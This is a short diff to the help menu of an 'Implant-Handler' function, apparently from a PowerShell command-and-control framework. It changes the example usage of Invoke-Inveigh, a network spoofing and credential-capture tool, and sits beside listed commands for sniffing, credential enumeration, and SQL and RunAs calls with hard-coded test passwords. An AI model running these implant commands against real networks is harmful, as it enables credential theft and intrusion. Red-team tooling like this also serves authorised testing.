@@ -171,7 +171,7 @@ function Implant-Handler
         Write-Host " Get-PassPol" -ForegroundColor Green
         Write-Host " Get-PassNotExp" -ForegroundColor Green
         Write-Host " Get-LocAdm" -ForegroundColor Green
-        Write-Host " Invoke-Inveigh -IP 10.0.0.1 -OutputFile C:\Temp\Output.txt" -ForegroundColor Green
+        Write-Host " Invoke-Inveigh -OutputDir C:\Temp\ -FileOutput Y -HTTP Y -NBNS Y -Tool 1" -ForegroundColor Green
         Write-Host " Invoke-Sniffer -OutputFile C:\Temp\Output.txt" -ForegroundColor Green
         Write-Host " Invoke-SqlQuery -sqlServer 10.0.0.1 -User sa -Pass sa -Query 'SELECT @@VERSION'" -ForegroundColor Green
         Write-Host " Invoke-RunAs -cmd 'powershell.exe' -args 'start-service -name WinRM' -Domain testdomain -Username 'test' -Password fdsfdsfds" -ForegroundColor Green
